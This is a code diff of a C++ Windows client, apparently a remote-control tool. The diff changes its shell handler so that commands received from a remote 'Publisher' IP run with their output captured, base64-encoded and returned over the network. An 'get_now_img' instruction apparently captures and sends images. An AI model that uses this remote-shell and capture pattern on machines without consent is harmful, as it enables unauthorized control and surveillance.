@@ -1,4 +1,4 @@
-//
+﻿//
 // Created by wj_de on 18-5-30.
 //
 
@@ -9,9 +9,12 @@
 #include<stdlib.h>
 #include "Protocol.h"
 #include<Windows.h>
-#include<opencv/cv.h>
-#include<opencv2/highgui/highgui.hpp>
+#include<opencv/cv.hpp>
+#include<opencv/highgui.h>
+#include"cmdshell.h"
+#include"base64.h"
 using namespace cv;
+
 void Cinstruct::find_instruct(map<string,string> &inst)
 {
 	string ip = inst["Publisher"];
@@ -19,13 +22,11 @@ void Cinstruct::find_instruct(map<string,string> &inst)
         string cmd = inst["command"];
   
         shell(cmd,ip);
-
     }
 	else if (inst["inst_type"] == "get_now_img")
 	{
 		get_now_img(ip);
 	}
-
 }
 void Cinstruct::get_now_img(string &ip)
 {
@@ -54,21 +55,17 @@ void Cinstruct::get_now_img(string &ip)
 }
 string Cinstruct::shell(const string &command,const string &ip) {
     cout<<"*****进入shell操作******"<<endl;
-	int n = system(command.c_str());
-	string req;
-	if (n != 0)
-	{
-		req = "flase";
-	}
-	else
-	{
-		req = "true";
-	}
+	MyCmdshell cmd;
+
+	string req = cmd.cmd_shell(command);
+	Base64 base;
+	string base_req = base.Encode(( unsigned char *)req.c_str(), req.length());
+	
     cout<<"*****shell操作结束******"<<endl;
     map<string,string> requst;
     requst["url"]="shellreq";
     requst["to"]=ip;
-    requst["body"]=req;
+    requst["body"]=base_req;
     CProtocol pro;
     string reqson=pro.structure(requst);
 	//cout <<reqson<<endl;
